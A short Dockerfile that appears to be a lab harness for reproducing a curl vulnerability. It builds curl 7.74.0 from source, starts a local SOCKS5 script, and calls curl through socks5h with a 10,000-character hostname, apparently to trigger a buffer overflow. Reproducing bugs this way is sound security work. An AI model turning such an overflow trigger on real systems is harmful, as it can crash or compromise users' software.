FROM alpine:latest

RUN apk update && apk add --no-cache \
    git \
    build-base \
    wget \
    python3 \
    openssl-dev \
    curl

WORKDIR /build

RUN wget https://github.com/curl/curl/releases/download/curl-7_74_0/curl-7.74.0.tar.gz
RUN tar -xzvf curl-7.74.0.tar.gz
WORKDIR /build/curl-7.74.0

RUN ./configure --with-openssl
RUN make -j$(getconf _NPROCESSORS_ONLN)
RUN make install

COPY mysocks.py /build/

ENTRYPOINT [ "/bin/sh" , "-c", "python3 /build/mysocks.py & sleep 2 && curl -vvv -x socks5h://localhost:1080 $(python3 -c \"print(('A'*10000), end='')\") && tail -f /dev/null"]
